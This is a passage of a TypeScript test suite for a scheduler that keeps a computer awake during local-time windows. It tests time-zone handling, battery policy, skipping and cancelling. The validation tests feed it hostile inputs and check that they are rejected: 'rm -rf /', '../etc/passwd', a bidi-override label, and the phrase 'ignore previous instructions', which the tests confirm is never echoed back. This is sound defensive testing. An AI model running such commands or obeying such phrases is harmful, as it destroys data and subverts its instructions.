// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Phoenix contributors
import { setImmediate } from "node:timers/promises";
import { describe, expect, it } from "vitest";
import {
  AwakeError,
  SessionController,
  type AwakeClock,
  type BatteryReading,
  type InhibitHandle,
  type SessionEndReason,
  type TimerHandle,
} from "@phoenix/capability-awake";
import {
  ACTIVE_RECHECK_MS,
  MAX_QUEUED_JOBS,
  MAX_SCHEDULES,
  MAX_WAKES,
  PowerQueue,
  QUEUE_RECHECK_MS,
  RESUME_MARGIN_PERCENT,
  ScheduledAwake,
  WAKE_LEAD_MS,
  WAKE_RETRY_MS,
  awakeControllerFromSession,
  judgePower,
  mergeWindows,
  occurrencesOf,
  parseScheduleInput,
  zonedToEpoch,
  type AwakeController,
  type PersistedState,
  type PowerSnapshot,
  type PowerSource,
  type QueueOutcome,
  type ScheduleEvent,
  type ScheduleSpec,
  type ScheduleStore,
  type ScheduleWindow,
  type WakeScheduler,
} from "../src/scheduled-awake";

const MIN = 60_000;
const HOUR = 60 * MIN;

async function flush(): Promise<void> {
  for (let i = 0; i < 8; i++) await setImmediate();
}

interface Timer {
  id: number;
  at: number;
  fn: () => void;
}

/** A clock that moves only when the test says so; `jump` models a machine that slept. */
class FakeClock implements AwakeClock {
  current: number;
  private nextId = 1;
  private timers: Timer[] = [];
  constructor(start: string) {
    this.current = Date.parse(start);
  }
  now(): number {
    return this.current;
  }
  setTimer(fn: () => void, ms: number): TimerHandle {
    const id = this.nextId++;
    this.timers.push({ id, at: this.current + ms, fn });
    return id;
  }
  clearTimer(handle: TimerHandle): void {
    this.timers = this.timers.filter((t) => t.id !== handle);
  }
  get pending(): number {
    return this.timers.length;
  }
  async advance(ms: number): Promise<void> {
    const target = this.current + ms;
    for (;;) {
      const due = this.timers
        .filter((t) => t.at <= target)
        .sort((a, b) => a.at - b.at || a.id - b.id)[0];
      if (!due) break;
      this.timers = this.timers.filter((t) => t !== due);
      this.current = Math.max(this.current, due.at);
      due.fn();
      await flush();
    }
    this.current = target;
    await flush();
  }
  async jump(ms: number): Promise<void> {
    this.current += ms;
    const due = this.timers.filter((t) => t.at <= this.current);
    this.timers = this.timers.filter((t) => t.at > this.current);
    for (const t of due) t.fn();
    await flush();
  }
}

interface FakeHold {
  id: string;
  minutes: number;
  startedAt: number;
  endsAt: number;
  endedBy: SessionEndReason | null;
}

/** Records what the scheduler asks for; a hold also expires on its own like the real session. */
class FakeController implements AwakeController {
  readonly holds: FakeHold[] = [];
  /** A session somebody else holds: `start` is refused. */
  foreignSession = false;
  failStartWith: AwakeError | undefined;
  constructor(private readonly clock: AwakeClock) {}
  async start(minutes: number, label: string): Promise<string> {
    expect(label.startsWith("Scheduled: ")).toBe(true);
    if (this.foreignSession) throw new AwakeError("conflict", "already running");
    if (this.failStartWith) throw this.failStartWith;
    const now = this.clock.now();
    const id = `hold-${this.holds.length + 1}`;
    this.holds.push({
      id,
      minutes,
      startedAt: now,
      endsAt: now + minutes * MIN,
      endedBy: null,
    });
    return id;
  }
  extend(id: string, minutes: number): void {
    const hold = this.get(id);
    if (!this.alive(id)) throw new AwakeError("no_session", "gone");
    hold.endsAt += minutes * MIN;
    hold.minutes += minutes;
  }
  end(id: string, reason: SessionEndReason): void {
    const hold = this.get(id);
    if (hold.endedBy === null && this.clock.now() < hold.endsAt) hold.endedBy = reason;
  }
  alive(id: string): boolean {
    const hold = this.get(id);
    return hold.endedBy === null && this.clock.now() < hold.endsAt;
  }
  /** The user presses End in the keep-awake UI. */
  userEnds(): void {
    for (const h of this.holds) if (this.alive(h.id)) h.endedBy = "cancelled";
  }
  get running(): FakeHold[] {
    return this.holds.filter((h) => this.alive(h.id));
  }
  private get(id: string): FakeHold {
    const hold = this.holds.find((h) => h.id === id);
    if (!hold) throw new Error(`unknown hold ${id}`);
    return hold;
  }
}

class FakePower implements PowerSource {
  snapshot: PowerSnapshot = { battery: { kind: "none" }, lowPowerMode: false };
  throws = false;
  reads = 0;
  read(): Promise<PowerSnapshot> {
    this.reads += 1;
    if (this.throws) return Promise.reject(new Error("pmset exploded"));
    return Promise.resolve(this.snapshot);
  }
  onBattery(percent: number): void {
    this.snapshot = { ...this.snapshot, battery: { kind: "battery", percent, onBattery: true } };
  }
  onCharger(percent = 80): void {
    this.snapshot = { ...this.snapshot, battery: { kind: "battery", percent, onBattery: false } };
  }
  unknown(): void {
    this.snapshot = { ...this.snapshot, battery: { kind: "unknown" } };
  }
}

class MemoryStore implements ScheduleStore {
  saved: PersistedState | undefined;
  loadValue: unknown = null;
  saves = 0;
  failSave = false;
  failLoad = false;
  load(): Promise<unknown> {
    if (this.failLoad) return Promise.reject(new Error("disk"));
    return Promise.resolve(this.loadValue ?? this.saved ?? null);
  }
  save(state: PersistedState): Promise<void> {
    this.saves += 1;
    if (this.failSave) return Promise.reject(new Error("disk full"));
    this.saved = structuredClone(state);
    return Promise.resolve();
  }
}

class FakeWake implements WakeScheduler {
  readonly active = new Map<string, number>();
  readonly calls: string[] = [];
  failSchedule = false;
  failCancel = false;
  schedule(request: { key: string; at: number }): Promise<void> {
    this.calls.push(`schedule ${request.key}`);
    if (this.failSchedule) return Promise.reject(new Error("no privilege"));
    this.active.set(request.key, request.at);
    return Promise.resolve();
  }
  cancel(key: string): Promise<void> {
    this.calls.push(`cancel ${key}`);
    if (this.failCancel) return Promise.reject(new Error("no privilege"));
    this.active.delete(key);
    return Promise.resolve();
  }
}

interface Rig {
  clock: FakeClock;
  controller: FakeController;
  power: FakePower;
  store: MemoryStore;
  wake: FakeWake;
  events: ScheduleEvent[];
  scheduler: ScheduledAwake;
  make(): ScheduledAwake;
}

/** 2026-10-20 is a Tuesday. */
function rig(start = "2026-10-20T20:00:00Z", withWake = true): Rig {
  const clock = new FakeClock(start);
  const controller = new FakeController(clock);
  const power = new FakePower();
  const store = new MemoryStore();
  const wake = new FakeWake();
  const events: ScheduleEvent[] = [];
  const make = () =>
    new ScheduledAwake({
      clock,
      controller,
      power,
      store,
      ...(withWake ? { wake } : {}),
      emit: (e) => events.push(e),
    });
  return { clock, controller, power, store, wake, events, scheduler: make(), make };
}

const EVERY_DAY = [0, 1, 2, 3, 4, 5, 6];

function night(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: "night",
    label: "Overnight agents",
    timeZone: "UTC",
    start: "23:00",
    end: "07:00",
    days: EVERY_DAY,
    ...overrides,
  };
}

function spec(overrides: Record<string, unknown> = {}): ScheduleSpec {
  return parseScheduleInput(night(overrides));
}

function typesOf(events: ScheduleEvent[]): string[] {
  return events.map((e) => e.type);
}

describe("DST-safe local time", () => {
  it("resolves ordinary, gap and overlap wall times in New York", () => {
    const ny = "America/New_York";
    const d = (year: number, month: number, day: number) => ({ year, month, day });
    // Plain winter and summer days.
    expect(new Date(zonedToEpoch(ny, d(2026, 1, 15), 23, 0)).toISOString()).toBe(
      "2026-01-16T04:00:00.000Z",
    );
    expect(new Date(zonedToEpoch(ny, d(2026, 7, 15), 23, 0)).toISOString()).toBe(
      "2026-07-16T03:00:00.000Z",
    );
    // Spring forward 2026-03-08: 02:30 does not exist and lands after the gap, never before it.
    expect(new Date(zonedToEpoch(ny, d(2026, 3, 8), 2, 30)).toISOString()).toBe(
      "2026-03-08T07:30:00.000Z",
    );
    // Fall back 2026-11-01: 01:30 happens twice; the first (EDT) one is used.
    expect(new Date(zonedToEpoch(ny, d(2026, 11, 1), 1, 30)).toISOString()).toBe(
      "2026-11-01T05:30:00.000Z",
    );
  });

  it("keeps 23:00-07:00 at local clock times across clock changes, so the real length changes", () => {
    const s = spec({ timeZone: "America/New_York" });
    const hours = (from: string, to: string) =>
      occurrencesOf(s, Date.parse(from), Date.parse(to)).map((w) => ({
        key: w.key,
        hours: (w.endsAt - w.startsAt) / HOUR,
      }));
    // Night of 2026-03-07 -> 08 loses an hour; night of 2026-10-31 -> 11-01 gains one.
    expect(hours("2026-03-07T12:00:00Z", "2026-03-09T12:00:00Z")).toEqual([
      { key: "night@2026-03-07", hours: 7 },
      { key: "night@2026-03-08", hours: 8 },
    ]);
    expect(hours("2026-10-31T12:00:00Z", "2026-11-02T12:00:00Z")).toEqual([
      { key: "night@2026-10-31", hours: 9 },
      { key: "night@2026-11-01", hours: 8 },
    ]);
  });

  it("handles half-hour zones and a window whose start falls in the gap", () => {
    const kolkata = spec({ timeZone: "Asia/Kolkata", start: "22:30", end: "06:30" });
    const [w] = occurrencesOf(
      kolkata,
      Date.parse("2026-06-01T00:00:00Z"),
      Date.parse("2026-06-02T00:00:00Z"),
    );
    expect(w && new Date(w.startsAt).toISOString()).toBe("2026-05-31T17:00:00.000Z");
    const gap = spec({ timeZone: "America/New_York", start: "02:30", end: "04:30", days: [0] });
    const [g] = occurrencesOf(
      gap,
      Date.parse("2026-03-08T00:00:00Z"),
      Date.parse("2026-03-09T00:00:00Z"),
    );
    // Starts 03:30 EDT (07:30Z), ends 04:30 EDT: one real hour, not two.
    expect(g && (g.endsAt - g.startsAt) / HOUR).toBe(1);
  });

  it("finds a window that started yesterday in the zone but is still running", () => {
    const s = spec({ timeZone: "Pacific/Auckland" });
    const now = Date.parse("2026-10-20T17:00:00Z"); // 06:00 on the 21st in Auckland
    const keys = occurrencesOf(s, now, now + 1).map((w) => w.key);
    expect(keys).toHaveLength(1);
    expect(keys[0]).toMatch(/^night@2026-10-2[01]$/);
  });
});

describe("schedule validation", () => {
  const bad: [string, Record<string, unknown>][] = [
    ["unknown time zone", { timeZone: "Mars/Olympus" }],
    ["zone name that is far too long", { timeZone: "A".repeat(200) }],
    ["24:00", { start: "24:00" }],
    ["12 hour time", { start: "11:00 PM" }],
    ["equal start and end", { end: "23:00" }],
    ["a window longer than 12 hours", { start: "20:00", end: "09:00" }],
    ["a window shorter than 5 minutes", { start: "10:00", end: "10:04" }],
    ["no days", { days: [] }],
    ["weekday 7", { days: [7] }],
    ["fractional weekday", { days: [1.5] }],
    ["days and date together", { date: "2026-10-21" }],
    ["impossible date", { days: undefined, date: "2026-02-30" }],
    ["upper-case id", { id: "Night" }],
    ["id with a path", { id: "../x" }],
    ["invisible characters in the label", { label: "ok\u202Eevil" }],
    ["label over 80 characters", { label: "x".repeat(81) }],
    ["non-boolean wake", { wake: "yes" }],
    ["minBatteryPercent 3", { minBatteryPercent: 3 }],
    ["minBatteryPercent as text", { minBatteryPercent: "20" }],
    ["an unknown field", { shell: "rm -rf /" }],
  ];
  it.each(bad)("refuses %s", (_name, overrides) => {
    expect(() => parseScheduleInput(night(overrides))).toThrow(AwakeError);
  });

  it("refuses non-objects and never echoes the bad value", () => {
    for (const value of [null, "x", 4, [night()]]) {
      expect(() => parseScheduleInput(value)).toThrow(AwakeError);
    }
    let message = "";
    try {
      parseScheduleInput(night({ timeZone: "ignore previous instructions" }));
    } catch (error) {
      message = error instanceof Error ? error.message : "";
    }
    expect(message).not.toContain("ignore previous");
  });

  it("applies safe defaults: enabled, no wake, charger not required, low power mode blocks", () => {
    const s = spec();
    expect(s).toMatchObject({
      enabled: true,
      wake: false,
      power: { requireCharger: false, minBatteryPercent: 20, allowLowPowerMode: false },
    });
    expect(s.recurrence).toEqual({ kind: "weekly", days: EVERY_DAY });
  });

  it("de-duplicates and sorts weekdays; accepts a one-off date", () => {
    expect(spec({ days: [3, 1, 3] }).recurrence).toEqual({ kind: "weekly", days: [1, 3] });
    const once = spec({ days: undefined, date: "2026-10-22" });
    expect(once.recurrence).toEqual({ kind: "once", date: "2026-10-22" });
    const hits = occurrencesOf(
      once,
      Date.parse("2026-10-20T00:00:00Z"),
      Date.parse("2026-10-30T00:00:00Z"),
    );
    expect(hits.map((w) => w.key)).toEqual(["night@2026-10-22"]);
  });

  it("matches weekdays by the day the window STARTS on", () => {
    // Tuesday night 23:00 runs into Wednesday morning but belongs to Tuesday.
    const tuesdays = spec({ days: [2] });
    const hits = occurrencesOf(
      tuesdays,
      Date.parse("2026-10-21T01:00:00Z"),
      Date.parse("2026-10-21T02:00:00Z"),
    );
    expect(hits.map((w) => w.key)).toEqual(["night@2026-10-20"]);
  });
});

describe("overlap and merge rules", () => {
  const w = (id: string, from: number, to: number): ScheduleWindow => ({
    key: `${id}@d`,
    scheduleId: id,
    startsAt: from * HOUR,
    endsAt: to * HOUR,
  });

  it("merges overlapping and touching windows, keeps gaps apart, lists contributors", () => {
    const merged = mergeWindows([w("c", 20, 22), w("a", 0, 4), w("b", 3, 6), w("d", 6, 7)]);
    expect(merged).toEqual([
      { startsAt: 0, endsAt: 7 * HOUR, scheduleIds: ["a", "b", "d"], keys: ["a@d", "b@d", "d@d"] },
      { startsAt: 20 * HOUR, endsAt: 22 * HOUR, scheduleIds: ["c"], keys: ["c@d"] },
    ]);
  });

  it("lets a contained window disappear into the larger one", () => {
    const [only] = mergeWindows([w("big", 0, 10), w("small", 2, 3)]);
    expect(only).toMatchObject({ startsAt: 0, endsAt: 10 * HOUR });
  });

  it("refuses a schedule set that chains past 24 hours of continuous awake time", async () => {
    const { scheduler } = rig();
    await scheduler.upsertSchedule(night({ id: "a", start: "00:00", end: "12:00" }));
    await scheduler.upsertSchedule(night({ id: "b", start: "12:00", end: "23:59" }));
    // 00:00-12:00 + 12:00-23:59 + 23:59-... would run past a day.
    await expect(
      scheduler.upsertSchedule(night({ id: "c", start: "23:00", end: "10:00" })),
    ).rejects.toMatchObject({ kind: "limit" });
    expect(scheduler.status().schedules.map((s) => s.id)).toEqual(["a", "b"]);
  });

  it("caps the number of schedules", async () => {
    const { scheduler } = rig();
    for (let i = 0; i < MAX_SCHEDULES; i++) {
      await scheduler.upsertSchedule(night({ id: `s${i}`, start: "01:00", end: "02:00" }));
    }
    await expect(
      scheduler.upsertSchedule(night({ id: "one-more", start: "01:00", end: "02:00" })),
    ).rejects.toMatchObject({ kind: "limit" });
    // Replacing an existing id is not growth.
    await expect(
      scheduler.upsertSchedule(night({ id: "s0", start: "03:00", end: "04:00" })),
    ).resolves.toBeDefined();
  });
});

describe("power policy", () => {
  const policy = { requireCharger: false, minBatteryPercent: 30, allowLowPowerMode: false };
  const battery = (percent: number, onBattery: boolean, lowPowerMode: boolean | null = false) => ({
    battery: { kind: "battery", percent, onBattery } satisfies BatteryReading,
    lowPowerMode,
  });

  it("allows mains power, a desktop and a healthy battery", () => {
    expect(judgePower(policy, battery(5, false), false)).toEqual({ allowed: true });
    expect(judgePower(policy, { battery: { kind: "none" }, lowPowerMode: null }, false)).toEqual({
      allowed: true,
    });
    expect(judgePower(policy, battery(30, true), false)).toEqual({ allowed: true });
  });

  it("blocks below the minimum, needs a margin to resume, and blocks on a charger requirement", () => {
    expect(judgePower(policy, battery(29, true), false)).toEqual({
      allowed: false,
      reason: "battery_low",
    });
    expect(judgePower(policy, battery(30 + RESUME_MARGIN_PERCENT - 1, true), true)).toEqual({
      allowed: false,
      reason: "battery_low",
    });
    expect(judgePower(policy, battery(30 + RESUME_MARGIN_PERCENT, true), true)).toEqual({
      allowed: true,
    });
    expect(judgePower({ ...policy, requireCharger: true }, battery(99, true), false)).toEqual({
      allowed: false,
      reason: "needs_charger",
    });
  });

  it("treats Low Power Mode as a block unless allowed, and an unreadable battery as a block", () => {
    expect(judgePower(policy, battery(90, false, true), false)).toEqual({
      allowed: false,
      reason: "low_power_mode",
    });
    expect(
      judgePower({ ...policy, allowLowPowerMode: true }, battery(90, false, true), false),
    ).toEqual({
      allowed: true,
    });
    expect(judgePower(policy, battery(90, false, null), false)).toEqual({ allowed: true });
    expect(
      judgePower(policy, { battery: { kind: "unknown" }, lowPowerMode: false }, false),
    ).toEqual({
      allowed: false,
      reason: "power_unknown",
    });
  });
});

describe("holding the machine through the controller", () => {
  it("is off until opted in: a saved schedule alone holds nothing and sets no timers for holding", async () => {
    const { scheduler, controller, clock } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await clock.advance(12 * HOUR);
    expect(controller.holds).toHaveLength(0);
    expect(scheduler.status()).toMatchObject({ enabled: false, state: "off" });
    // The plan can be previewed while off; nothing acts on it.
    expect(scheduler.status().upcoming.length).toBeGreaterThan(0);
  });

  it("holds from 23:00 and releases at 07:00 exactly, for the window length", async () => {
    const { scheduler, controller, clock } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    expect(controller.holds).toHaveLength(0);
    await clock.advance(3 * HOUR - MIN); // 22:59
    expect(controller.holds).toHaveLength(0);
    await clock.advance(MIN); // 23:00
    expect(controller.holds).toHaveLength(1);
    expect(controller.holds[0]).toMatchObject({
      minutes: 8 * 60,
      startedAt: Date.parse("2026-10-20T23:00:00Z"),
    });
    expect(scheduler.status()).toMatchObject({
      state: "holding",
      holdEndsAt: Date.parse("2026-10-21T07:00:00Z"),
    });
    await clock.advance(8 * HOUR - MIN); // 06:59
    expect(controller.running).toHaveLength(1);
    await clock.advance(MIN); // 07:00
    expect(controller.running).toHaveLength(0);
    expect(scheduler.status().state).toBe("idle");
  });

  it("starts partway through when enabled during a window, with the remaining time", async () => {
    const { scheduler, controller } = rig("2026-10-21T05:30:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    expect(controller.holds).toHaveLength(1);
    expect(controller.holds[0]?.minutes).toBe(90);
  });

  it("runs the 7-hour and 9-hour nights that clock changes make", async () => {
    const r = rig("2026-03-07T21:00:00-05:00");
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(night({ timeZone: "America/New_York" }));
    await r.scheduler.setEnabled(true);
    await r.clock.advance(3 * HOUR); // 00:00 EST... 23:00 EST is 2 h away
    expect(r.controller.holds.map((h) => h.minutes)).toEqual([7 * 60]);
    await r.clock.advance(7 * HOUR);
    expect(r.controller.running).toHaveLength(0);
    expect(new Date(r.controller.holds[0]?.endsAt ?? 0).toISOString()).toBe(
      "2026-03-08T11:00:00.000Z",
    );
  });

  it("does not leave the machine awake when the process slept through the window", async () => {
    const { scheduler, controller, clock } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    await clock.jump(15 * HOUR); // asleep from 20:00 to 11:00 next day
    expect(controller.holds).toHaveLength(0);
    expect(scheduler.status().state).toBe("idle");
  });

  it("releases a hold that is still running when the machine wakes after the window end", async () => {
    const { scheduler, controller, clock } = rig("2026-10-21T00:30:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    expect(controller.running).toHaveLength(1);
    await clock.jump(9 * HOUR);
    expect(controller.running).toHaveLength(0);
  });

  it("merges overlapping schedules into one hold, extended when the second begins", async () => {
    const { scheduler, controller, clock } = rig("2026-10-21T00:30:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night({ id: "a", start: "00:00", end: "03:00" }));
    await scheduler.upsertSchedule(night({ id: "b", start: "02:00", end: "06:00" }));
    await scheduler.setEnabled(true);
    expect(controller.holds).toHaveLength(1);
    // The first hold already covers the chain a+b, not just a.
    expect(controller.holds[0]).toMatchObject({ minutes: 330 });
    await clock.advance(5 * HOUR + 29 * MIN);
    expect(controller.running).toHaveLength(1);
    await clock.advance(MIN);
    expect(controller.running).toHaveLength(0);
    expect(controller.holds).toHaveLength(1);
  });

  it("extends the running hold when an edit lengthens the window, and shortens it on a shorter one", async () => {
    const { scheduler, controller, clock } = rig("2026-10-21T01:00:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night({ end: "03:00", start: "00:00" }));
    await scheduler.setEnabled(true);
    expect(controller.holds[0]?.minutes).toBe(120);
    await scheduler.upsertSchedule(night({ end: "05:00", start: "00:00" }));
    expect(controller.holds).toHaveLength(1);
    expect(controller.holds[0]).toMatchObject({ minutes: 240 });
    // Shortened to end at 02:00 (an hour from now): the hold is released at the new end, not 05:00.
    await clock.advance(0);
    await scheduler.upsertSchedule(night({ end: "02:00", start: "00:00" }));
    expect(scheduler.status().holdEndsAt).toBe(Date.parse("2026-10-21T02:00:00Z"));
    await clock.advance(HOUR);
    expect(controller.running).toHaveLength(0);
    expect(controller.holds[0]?.endedBy).toBe("expired");
    // An edit that puts the end in the past releases at once.
    const again = rig("2026-10-21T04:00:00Z");
    await again.scheduler.start();
    await again.scheduler.upsertSchedule(night({ start: "00:00", end: "06:00" }));
    await again.scheduler.setEnabled(true);
    expect(again.controller.running).toHaveLength(1);
    await again.scheduler.upsertSchedule(night({ start: "00:00", end: "03:00" }));
    expect(again.controller.running).toHaveLength(0);
  });

  it("never holds for a disabled schedule, and removing one releases its hold", async () => {
    const { scheduler, controller } = rig("2026-10-21T01:00:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night({ enabled: false }));
    await scheduler.setEnabled(true);
    expect(controller.holds).toHaveLength(0);
    await scheduler.upsertSchedule(night());
    expect(controller.running).toHaveLength(1);
    await scheduler.removeSchedule("night");
    expect(controller.running).toHaveLength(0);
    await expect(scheduler.removeSchedule("night")).rejects.toBeInstanceOf(AwakeError);
  });

  it("opting out releases the hold at once and cancels timers' work", async () => {
    const { scheduler, controller, wake } = rig("2026-10-21T01:00:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night({ wake: true }));
    await scheduler.setEnabled(true);
    expect(controller.running).toHaveLength(1);
    await scheduler.setEnabled(false);
    expect(controller.running).toHaveLength(0);
    expect(controller.holds[0]?.endedBy).toBe("disabled");
    expect(wake.active.size).toBe(0);
  });
});

describe("cancel and skip", () => {
  it("cancelCurrent ends the running hold, survives refreshes, and tomorrow still runs", async () => {
    const { scheduler, controller, clock } = rig("2026-10-21T01:00:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    const result = await scheduler.cancelCurrent();
    expect(result.skipped).toEqual(["night@2026-10-20"]);
    expect(controller.holds[0]?.endedBy).toBe("cancelled");
    await scheduler.refresh();
    await clock.advance(30 * MIN);
    expect(controller.holds).toHaveLength(1);
    expect(scheduler.status().state).toBe("idle");
    await clock.advance(22 * HOUR); // 2026-10-21T23:30Z
    expect(controller.holds).toHaveLength(2);
    expect(controller.running).toHaveLength(1);
  });

  it("skips a future occurrence: no hold, no wake; unskip brings both back", async () => {
    const { scheduler, controller, clock, wake } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night({ wake: true }));
    await scheduler.setEnabled(true);
    expect(wake.active.has("awake:night@2026-10-20")).toBe(true);
    await scheduler.skipWindow("night@2026-10-20");
    expect(wake.active.has("awake:night@2026-10-20")).toBe(false);
    expect(scheduler.status().upcoming[0]).toMatchObject({
      key: "night@2026-10-20",
      skipped: true,
    });
    expect(scheduler.status().merged[0]?.keys).toEqual(["night@2026-10-21"]);
    await clock.advance(5 * HOUR);
    expect(controller.holds).toHaveLength(0);
    await scheduler.unskipWindow("night@2026-10-20");
    expect(controller.running).toHaveLength(1);
  });

  it("refuses to skip something that is not an upcoming window and bounds the skip list", async () => {
    const { scheduler } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    for (const key of [
      "night@2020-01-01",
      "nope@2026-10-20",
      "../etc/passwd",
      "night@2027-10-20",
    ]) {
      await expect(scheduler.skipWindow(key)).rejects.toMatchObject({ kind: "invalid" });
    }
    await scheduler.skipWindow("night@2026-10-21");
    await expect(scheduler.skipWindow("night@2026-10-21")).resolves.toBeDefined();
    expect(scheduler.status().skips).toEqual(["night@2026-10-21"]);
  });

  it("forgets a skip once its occurrence is over", async () => {
    const { scheduler, clock } = rig();
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    await scheduler.skipWindow("night@2026-10-20");
    await clock.advance(12 * HOUR);
    expect(scheduler.status().skips).toEqual([]);
  });

  it("does not restart a window after the user ends the hold themselves", async () => {
    const { scheduler, controller, clock } = rig("2026-10-21T01:00:00Z");
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    controller.userEnds();
    await clock.advance(5 * MIN);
    expect(controller.holds).toHaveLength(1);
    expect(scheduler.status().state).toBe("idle");
    await clock.advance(21 * HOUR); // next night's 23:00 is 22 h after 01:00
    await clock.advance(HOUR);
    expect(controller.holds).toHaveLength(2);
  });
});

describe("battery and Low Power Mode", () => {
  async function overnight(overrides: Record<string, unknown>, at = "2026-10-20T23:30:00Z") {
    const r = rig(at);
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(night(overrides));
    return r;
  }

  it("waits for the charger, then holds when it is plugged in, and releases when unplugged", async () => {
    const r = await overnight({ requireCharger: true });
    r.power.onBattery(90);
    await r.scheduler.setEnabled(true);
    expect(r.controller.holds).toHaveLength(0);
    expect(r.scheduler.status()).toMatchObject({
      state: "waiting",
      waitingReason: "needs_charger",
    });
    r.power.onCharger(90);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(1);
    expect(r.controller.holds[0]?.minutes).toBe(7 * 60 + 29);
    r.power.onBattery(90);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(0);
    expect(r.controller.holds[0]?.endedBy).toBe("battery");
    expect(r.scheduler.status().waitingReason).toBe("needs_charger");
  });

  it("pauses below the minimum level and resumes only with a margin", async () => {
    const r = await overnight({ minBatteryPercent: 30 });
    r.power.onBattery(50);
    await r.scheduler.setEnabled(true);
    expect(r.controller.running).toHaveLength(1);
    r.power.onBattery(29);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(0);
    r.power.onBattery(30);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(0);
    r.power.onBattery(30 + RESUME_MARGIN_PERCENT);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(1);
    expect(r.controller.holds).toHaveLength(2);
  });

  it("releases for Low Power Mode unless the schedule allows it", async () => {
    const r = await overnight({});
    r.power.onCharger(80);
    await r.scheduler.setEnabled(true);
    expect(r.controller.running).toHaveLength(1);
    r.power.snapshot = { ...r.power.snapshot, lowPowerMode: true };
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(0);
    expect(r.scheduler.status().waitingReason).toBe("low_power_mode");

    const allowed = await overnight({ allowLowPowerMode: true });
    allowed.power.snapshot = {
      battery: { kind: "battery", percent: 80, onBattery: false },
      lowPowerMode: true,
    };
    await allowed.scheduler.setEnabled(true);
    expect(allowed.controller.running).toHaveLength(1);
  });

  it("starts nothing while power is unreadable; a running hold survives two bad reads, not three", async () => {
    const blind = await overnight({});
    blind.power.unknown();
    await blind.scheduler.setEnabled(true);
    expect(blind.controller.holds).toHaveLength(0);
    expect(blind.scheduler.status().waitingReason).toBe("power_unknown");

    const r = await overnight({});
    await r.scheduler.setEnabled(true);
    expect(r.controller.running).toHaveLength(1);
    r.power.unknown();
    await r.clock.advance(ACTIVE_RECHECK_MS);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(1);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(0);
    // A good read in between resets the count.
    const again = await overnight({});
    await again.scheduler.setEnabled(true);
    for (let i = 0; i < 4; i++) {
      again.power.unknown();
      await again.clock.advance(ACTIVE_RECHECK_MS);
      again.power.snapshot = { battery: { kind: "none" }, lowPowerMode: false };
      await again.clock.advance(ACTIVE_RECHECK_MS);
    }
    expect(again.controller.running).toHaveLength(1);
  });

  it("treats a power reader that throws as unreadable", async () => {
    const r = await overnight({});
    r.power.throws = true;
    await r.scheduler.setEnabled(true);
    expect(r.controller.holds).toHaveLength(0);
    expect(r.scheduler.status().waitingReason).toBe("power_unknown");
  });

  it("holds only the allowed part of an overlapping chain", async () => {
    const r = rig("2026-10-21T01:00:00Z");
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(night({ id: "a", start: "00:00", end: "03:00" }));
    await r.scheduler.upsertSchedule(
      night({ id: "b", start: "02:00", end: "06:00", requireCharger: true }),
    );
    r.power.onBattery(80);
    await r.scheduler.setEnabled(true);
    expect(r.controller.holds[0]?.minutes).toBe(120);
    await r.clock.advance(2 * HOUR);
    expect(r.controller.running).toHaveLength(0);
    expect(r.scheduler.status().waitingReason).toBe("needs_charger");
    r.power.onCharger(80);
    await r.clock.advance(ACTIVE_RECHECK_MS);
    expect(r.controller.running).toHaveLength(1);
    expect(r.controller.running[0]?.endsAt).toBe(Date.parse("2026-10-21T06:00:00Z"));
  });

  it("applies each schedule's own policy when several windows overlap", async () => {
    const r = rig("2026-10-21T01:00:00Z");
    await r.scheduler.start();
    await r.scheduler.upsertSchedule(
      night({ id: "strict", start: "00:00", end: "05:00", requireCharger: true }),
    );
    await r.scheduler.upsertSchedule(night({ id: "lenient", start: "00:00", end: "05:00" }));
    r.power.onBattery(80);
    await r.scheduler.setEnabled(true);
    expect(r.controller.running).toHaveLength(1);
  });
});

describe("controller refusals and failures", () => {
  it("waits while somebody else's keep-awake session runs and takes over when it ends", async () => {
    const { scheduler, controller, clock } = rig("2026-10-21T01:00:00Z");
    controller.foreignSession = true;
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    expect(scheduler.status()).toMatchObject({ state: "waiting", waitingReason: "busy" });
    controller.foreignSession = false;
    await clock.advance(ACTIVE_RECHECK_MS);
    expect(controller.holds).toHaveLength(1);
    expect(controller.holds[0]?.minutes).toBe(6 * 60 - 1);
  });

  it("reports the controller's battery floor and unexpected failures without crashing", async () => {
    const { scheduler, controller, events } = rig("2026-10-21T01:00:00Z");
    controller.failStartWith = new AwakeError("battery_low", "below floor");
    await scheduler.start();
    await scheduler.upsertSchedule(night());
    await scheduler.setEnabled(true);
    expect(scheduler.status().waitingReason).toBe("battery_floor");
